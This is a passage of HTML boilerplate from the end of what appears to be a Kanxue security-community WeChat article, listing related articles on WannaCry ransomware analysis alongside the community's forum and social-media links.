href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458282923&amp;idx=1&amp;sn=be6293777eace8c4579dfa2688d014bf&amp;chksm=b1815b2186f6d237a72ae3dee7e29c4c2ec7a140b110daa7eb808723f58bf852e191eebcbdfc&amp;scene=21#wechat_redirect" target="_blank">蠕虫勒索软件WannaCrypt0r的行为分析</a><br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458282703&amp;idx=3&amp;sn=bfa728ff73cd389cd9258ca32008c6e2&amp;chksm=b1815a4586f6d353468f3adf9545aab3ffdce4f4c3e0e47c967298eca045db0558e37865c3a7&amp;scene=21#wechat_redirect" target="_blank" style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></a><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458282923&amp;idx=2&amp;sn=97b766ca3c3ed53d3135be937135e789&amp;chksm=b1815b2186f6d237e580205d6de5dae235d77732aa6eed5a4f124c042b59da07abcfe1c61081&amp;scene=21#wechat_redirect" target="_blank" style="font-size: 15px; text-decoration: none;"><span style="font-size: 15px;">还能和wannacry的黑客讨价还价？</span></a><br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458282903&amp;idx=1&amp;sn=ba8828786e9717016b399020a2427850&amp;chksm=b1815b1d86f6d20b9a60848ac2165b8ecacc8809f91851f2ffefc2bcd49f2007c07f42620f99&amp;scene=21#wechat_redirect" target="_blank">谁动了我的论文？我们来扒一扒勒索软件的前世今生</a><br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;">......<br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></p></li></ul><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;">更多优秀文章，长按下方二维码，“<span style="max-width: 100%; color: rgb(0, 122, 170);">关注看雪学院公众号</span>”查看！</span></p><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></p><p style="max-width: 100%; min-height: 1em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><img src="/ikanxue/images/a0942aca19665d63c4ee222be971a37cd63dc1e4.jpeg" style="box-sizing: border-box !important; overflow-wrap: break-word !important; visibility: visible !important; width: 640px !important; height: 426px !important;"></p><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span><span style="max-width: 100%; color: rgb(178, 178, 178); box-sizing: border-box !important; overflow-wrap: break-word !important; font-size: 15px;">看雪论坛：http://bbs.pediy.com/</span><span style="max-width: 100%; color: rgb(178, 178, 178); font-size: 14px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; color: rgb(178, 178, 178); font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;">微信公众号 ID：ikanxue</span></p><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; color: rgb(178, 178, 178); font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;">微博：看雪安全</span></p><p style="max-width: 100%; min-height: 1em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; color: rgb(178, 178, 178); font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;">投稿、合作：www.kanxue.com</span></p><hr/><a href="http://mp.weixin.qq.com/s?timestamp=1495451790&src=3&ver=1&signature=l12Tij*JEXuplVxFRWdZeeBDuFUhCzsMu*BB0SOQM33MAgARkNLSZo0jyCA7SaUudhiQ0fHPlvS7dX48MRKYXSrLlTR9q-5z2hY61lcY4A5bZJkqy6EQI*hJoAwgs8lPXGK08lJrCesnjR0aLLDZy6L0gViSbXlj0ik*zR5TqSg=">微信地址</a> | <a href="http://bbs.pediy.com/thread-217632.htm">阅读原文</a>
{% endraw  %}

